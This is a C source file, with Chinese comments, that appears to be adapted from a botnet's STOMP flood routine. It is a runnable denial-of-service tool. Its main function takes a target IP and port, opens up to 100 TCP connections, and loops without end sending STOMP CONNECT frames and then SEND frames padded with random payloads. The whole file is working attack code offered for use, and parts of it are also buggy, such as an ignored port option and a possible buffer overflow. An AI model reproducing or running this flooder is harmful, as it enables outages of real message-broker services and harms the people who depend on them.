#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <netdb.h>
#include <time.h>

#define MAX_FDS 100

// 攻击选项宏定义
#define ATK_OPT_PAYLOAD_SIZE 1
#define ATK_OPT_DPORT        2

// 攻击选项结构体
struct attack_option {
    int key;
    const char *val;
};

// 攻击目标结构体
struct attack_target {
    uint32_t addr;
    uint16_t port;
};

void rand_str(unsigned char *buf, int size) {
    for (int i = 0; i < size; ++i) {
        buf[i] = 'A' + rand() % 26;
    }
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, int option, int default_val) {
    for (int i = 0; i < opts_len; ++i) {
        if (opts[i].key == option) {
            return atoi(opts[i].val);
        }
    }
    return default_val;
}

void attack_stomp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    uint16_t size = 0;
    uint16_t port = 0;

    size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1);
    port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 61613);

    struct sockaddr_in addr;
    char *buf = (char *)malloc(size);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    memset(buf, 0, size);

    struct state {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for (clear = 0; clear < MAX_FDS; clear++) {
        states[clear].fd = -1;
        states[clear].state = 0;
        states[clear].timeout = 0;
    }

    while (1) {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for (i = 0; i < MAX_FDS; i++) {
            switch (states[i].state) {
                case 0:
                    if ((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                        continue;
                    }
                    if (connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
                        close(states[i].fd);
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                case 1:
                    char connect_frame[1024];
                    sprintf(connect_frame, "CONNECT\n\n\x00");

                    if (send(states[i].fd, connect_frame, strlen(connect_frame), MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }

                    states[i].state = 2;
                    break;
                case 2:
                    char send_frame[1024];
                    if (size == 1) {
                        size = 500 + rand() % 400;
                    }
                    rand_str((unsigned char *)buf, size);
                    sprintf(send_frame, "SEND\ncontent-length:%d\n\n%s\x00", size, buf);

                    if (send(states[i].fd, send_frame, strlen(send_frame), MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }
                    break;
            }
        }
    }

    free(buf);
    return;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <target_port> [payload_size]\n", argv[0]);
        return 1;
    }

    struct attack_target target;
    target.addr = inet_addr(argv[1]);
    target.port = atoi(argv[2]);

    struct attack_option options[1];
    options[0].key = ATK_OPT_PAYLOAD_SIZE;
    options[0].val = (argc > 3) ? argv[3] : "1"; // 可选参数：数据包大小

    attack_stomp_socket(1, &target, 1, options);
    return 0;
}